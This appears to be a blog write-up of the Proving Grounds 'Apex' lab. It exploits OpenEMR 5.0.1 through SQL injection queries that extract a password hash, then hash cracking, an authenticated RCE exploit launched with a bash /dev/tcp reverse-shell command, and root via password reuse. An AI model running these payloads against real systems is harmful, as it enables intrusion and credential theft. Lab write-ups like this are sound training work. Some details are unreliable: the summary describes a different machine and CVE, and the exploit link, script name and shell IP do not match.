---
layout: single
title: Apex - Proving grounds Practice
date: 2023-06-21
classes: wide
header:
  teaser: /assets/images/linux.png
categories:
  - provinggrounds
  - infosec
tags:
  - provinggrounds
  - linux
  - intermediate
  - web
  - sqli
  - openemr
  - passwordcracking
---

## Linux

![](/assets/images/linux.png)

This blog post is a writeup of the Helpdesk machine from Proving grounds practice.

### Summary
------------------
- ManageEngine allows us to access with the default credentials.
- Having a valid user, we are able to exploit CVE-2014-5301 and get a reverse shell as a privileged user.

### Detailed steps
------------------

### Enumeration

I started enumerating the open ports with:
```
nmap -Pn -p- 192.168.164.145
```
![nmap1](\assets\images\pg-practice-apex\1.JPG)

Knowing which ports are open, I executed an agressive nmap with:
```
nmap -A 192.168.164.145 -p 80,445,3306 -o nmapa.txt
```
![nmap2](\assets\images\pg-practice-apex\2.JPG)

As we can see in the last picture, there is a web server, a mysql server and a smb server.
By accessing the website I was able to see a sanitary webpage. By clicking on `Scheduler` I could access to a login page.

![webpage1](\assets\images\pg-practice-apex\5.JPG)

This login page shows that we are in front of a `OpenEMR`
![webpage2](\assets\images\pg-practice-apex\6.JPG)

In order to find out the OpenEMR version, I found a common OpenEMR directory named 'sql' which was present in this server.
This directory stores sql files which are generated in the updates. Knowing this, we can deduce OpenEMR version (`5.0.1` in this case).
![webpage3](\assets\images\pg-practice-apex\80.JPG)

Also this directory contains some more interesting files as database.sql. This file shows the structure of the OpenEMR database.
![webpage4](\assets\images\pg-practice-apex\89.JPG)

### Explotation

This OpenEMR version is vulnerable to some `sql injections` we can find in the following report:
https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf

This image shows the vulnerable files:
![sqli](\assets\images\pg-practice-apex\81.JPG)

Trying to search for these files I was able to acces to "add_edit_event_user.php" so I worked with this file.
![sqli2](\assets\images\pg-practice-apex\83.JPG)

To make this job easier, I looked in the database.sql file mentioned above. I could find a table named 'user_secure' which contains usernames and passwords.
![sqli2_"](\assets\images\pg-practice-apex\91_2.JPG)

After some attemps, I found a valid query using "substring" which can extract half password hash:
![sqli3](\assets\images\pg-practice-apex\90.JPG)

Modifying this query I was able to get the other half (just replacing 1,32 by 32,60):
![sqli4](\assets\images\pg-practice-apex\92.JPG)
Querys:
```
eid=1 AND EXTRACTVALUE(0x3b,(SELECT Substring(password,1,32)FROM users_secure LIMIT 0,1)))
eid=1 AND EXTRACTVALUE(0x3b,(SELECT Substring(password,32,64)FROM users_secure LIMIT 0,1)))
```

Hash:
```
$2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC
```

I used this page to analyse the hash --> https://hashes.com/es/tools/hash_identifier
As we can see in the picture, we are in front of a `bcrypt $2*$, Blowfish (Unix)`
![hash1](\assets\images\pg-practice-apex\93.JPG)

Knowing the type of hash I cracked it with hashcat:
![hash2](\assets\images\pg-practice-apex\95.JPG)

Now, having this password I was able to log in successfully to the web portal as admin user:
![access](\assets\images\pg-practice-apex\96.JPG)
![access2](\assets\images\pg-practice-apex\97.JPG)


`OpenEMR 5.0.1` is also vulnerable to a remote code execution (authenticated). This means that at this point I could exploit it.

In order to gain access I downloaded a python exploit from: https://www.exploit-db.com/exploits/48515
Opening a netcat listener and executing this exploit with the following paramaters, I was able to catch the shell.
```
python2 45161.py http://192.168.164.145/openemr -u admin -p thedoctor -c "bash -c 'bash -i >& /dev/tcp/192.168.164.145/5555 0>&1'"
```
![shell](\assets\images\pg-practice-apex\101.JPG)
![shell2](\assets\images\pg-practice-apex\102.JPG)

Being www-data user I was able to find the user flag:
![flag1](\assets\images\pg-practice-apex\103.JPG)


### Privilege escalation

In order to elevate privileges I have been looking for a way for a while until I realised that I could use the previously obtained password again.
Just typing su root and using "thedoctor" as password I was able to log in as root and find the root flag.
![root](\assets\images\pg-practice-apex\227.JPG)
![flag2](\assets\images\pg-practice-apex\228.JPG)
